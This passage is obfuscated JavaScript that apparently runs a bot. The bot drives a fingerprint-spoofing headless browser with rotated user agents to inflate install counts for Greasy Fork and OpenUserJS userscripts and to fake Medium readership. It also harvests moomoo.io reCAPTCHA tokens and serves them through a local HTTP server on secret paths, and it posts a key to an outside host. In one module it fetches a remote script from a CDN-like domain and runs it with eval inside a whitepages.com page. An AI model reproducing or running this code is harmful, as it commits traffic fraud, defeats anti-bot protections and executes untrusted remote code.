      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + W(0x7, 'uurD') + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + V(0x2) + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + V(0x14) + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    W(0x15, '$hyW') + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + W(0x3, 'AlV#') + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + V(0x1) + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x239 + -0x37 * 0x13 + 0x64e
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x2668 * 0x1 + 0x1 * 0x16de + -0x3d46)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x16e1 + -0x2 * -0x56e + 0x2159 * -0x1), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0xaa * -0x1 + 0x1 * 0xa1b + 0x1 * -0x90d), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x3 * 0xcb5 + -0x74c + -0x1ed3;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x11dc + 0x1 * 0xbe9 + 0x1 * 0x5f3; w < getRandomInt(0x11c * -0x1 + 0x3c7 + -0x2aa, 0x1d8a + 0x309 + -0x208e); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x2a * -0x1d0 + 0x1755a + -0xc92 * 0x5);
        }
      }();
    }, -0x5f * 0x36 + 0x1592 + -0x4 * 0x49), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const X = b;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x1 * 0x1cf7 + 0x35 * 0x2e + -0x267d;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + X(0x11, 'KKAo') + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1ae5 + 0x1e7d + -0x4 * 0xe6, -0x1831 + -0x109c + 0x28ff)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0xb20 + -0x4 * -0x1ce1 + -0xf2 * 0xa);
    }, 0x5ce * -0x1 + -0x19c6 + 0x1ff8), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x3 * -0x1cd + 0x22 * -0xed + 0x24e1;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x1a8e + 0x2426 + 0x8 * 0x44), await u['evaluate'](() => {
            const Y = c;
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + Y(0x5) + 'me/cdn/xm7' + '7/wp.js', 0x1be3 + -0x205c + 0x479), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x969e6 + 0xc419 * 0x8 + -0x1cf0e);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x222a + 0x7 * 0x4a9 + -0x4265);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x4b7 * 0x1 + -0x150a + 0x1 * 0x1a89);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x99b + -0x9 * -0x522 + -0xd * 0x63);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x37c + -0xa1d + 0xd99);
    let h = e[f];
    if (b['pJttBF'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x160 * -0xd + 0x169d + -0x287d, s, t, u = -0x1 * -0x25f9 + -0x12ef * 0x1 + 0x1 * -0x130a; t = n['charAt'](u++); ~t && (s = r % (-0x47e + -0x1a73 + -0x1 * -0x1ef5) ? s * (-0x83 * -0x21 + -0x1d * 0x2 + -0x1069) + t : t, r++ % (0x11d6 * 0x1 + -0x1 * 0x10db + -0xf7)) ? p += String['fromCharCode'](-0x17dc + -0x1 * 0x2ef + -0x1bca * -0x1 & s >> (-(-0x121c + -0xf7 * 0x22 + 0x32ec) * r & -0x86 * -0x4 + -0x1 * -0x169b + 0x18ad * -0x1)) : -0x1f19 + -0xa7e * -0x1 + -0x41f * -0x5) {
          t = o['indexOf'](t);
        }
        for (let v = 0x33d * 0xb + 0x1370 + -0x370f, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x2 * 0xc02 + 0x1776 + -0x2f6a))['slice'](-(0xd12 + 0x229d + 0x1 * -0x2fad));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x3 * -0x4a9 + -0x413 * -0x6 + -0x266d,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0xc3b * -0x3 + -0x1 * -0xde4 + 0x16cd; u < 0xc43 + 0x1 * -0x12d1 + 0x78e * 0x1; u++) {
          p[u] = u;
        }
        for (u = -0x114f + 0x1df1 + 0x42 * -0x31; u < 0x8c4 + -0x26 * 0x8c + 0xd04; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x19c + -0x170c + -0x10 * -0x167), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1c20 + 0x125a + 0x9c6, q = 0xdd4 + 0x12b4 + 0x2088 * -0x1;
        for (let v = 0xd0b + 0xfc2 * -0x2 + 0x1279; v < n['length']; v++) {
          u = (u + (0x1 * -0x120a + 0x5d3 + -0x2 * -0x61c)) % (0x1da6 + 0x2 * 0xda3 + -0x6 * 0x952), q = (q + p[u]) % (0xa0 * 0x2b + 0xeac + -0x14 * 0x207), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x123e + -0x8 * -0xfc + -0x191e)]);
        }
        return t;
      };
      b['ihAJdV'] = m, c = arguments, b['pJttBF'] = !![];
    }
    const j = e[0xa51 * 0x3 + 0x15df + -0x34d2],
      k = f + j,
      l = c[k];
    return !l ? (b['EvVPSQ'] === undefined && (b['EvVPSQ'] = !![]), h = b['ihAJdV'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
doFlags['doOUJS'] && ((async () => {
  const a0 = b,
    Z = d;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1 * -0x1a9b + -0x1f0 * -0x10 + -0x464) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1384 + 0x385 + 0x4 * 0x400));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1 * -0x3b7 + 0xdd3 + -0x118a, D['indexOf']('\x20'));
        return B ? E['slice'](-0x7c2 * 0x5 + 0x1 * 0x1ff9 + 0x6d1, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x3f40 + 0x39fd + 0x2c53),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x853 + -0x1b2 + 0x206f),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      Z(0x4) + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + a0(0x1a, 'BnO8') + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1 * -0xbd4 + -0x1787 + 0x235b; k < 0x137 * -0x20 + -0x1dd2 + -0xa * -0x6df; k++)
    setTimeout(f, (0xc11 + 0x74 * 0x31f + -0x8bbd * 0x1) * k * getRandomInt(-0x1 * 0x23bb + 0x7eb + 0x1bd1, -0x3 * -0x966 + 0x1279 + -0x2ea8));
  setInterval(() => {
    f();
